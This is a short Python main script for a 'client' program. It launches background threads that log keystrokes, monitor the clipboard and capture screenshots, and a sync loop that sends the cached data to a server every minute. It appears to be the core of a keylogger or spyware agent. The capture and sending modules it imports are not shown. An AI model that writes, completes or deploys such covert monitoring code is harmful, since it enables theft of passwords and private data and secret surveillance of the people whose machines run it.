import os
import sys

# Add client directory to the Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Now import other modules
import time
import threading
from utils import log
from cache import ensure_cache_directory
from clipboard import start_clipboard_monitoring
from keystrokes import start_keystrokes_monitoring
from screenshots import start_screenshots_capture
from sender import server_is_online, send_cached_data


def cache_sync_loop():
    while True:
        time.sleep(60)  # Check every minute
        if server_is_online():
            send_cached_data()


def main():
    log("Client starting...")

    # Ensure cache directory exists
    ensure_cache_directory()

    # Start all monitoring modules in separate threads
    threading.Thread(target=start_clipboard_monitoring, daemon=True).start()
    threading.Thread(target=start_keystrokes_monitoring, daemon=True).start()
    threading.Thread(target=start_screenshots_capture, daemon=True).start()

    # Start cache sync thread
    threading.Thread(target=cache_sync_loop, daemon=True).start()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)  # Sleep to reduce CPU usage
    except KeyboardInterrupt:
        log("Client shutting down...")


if __name__ == "__main__":
    main()
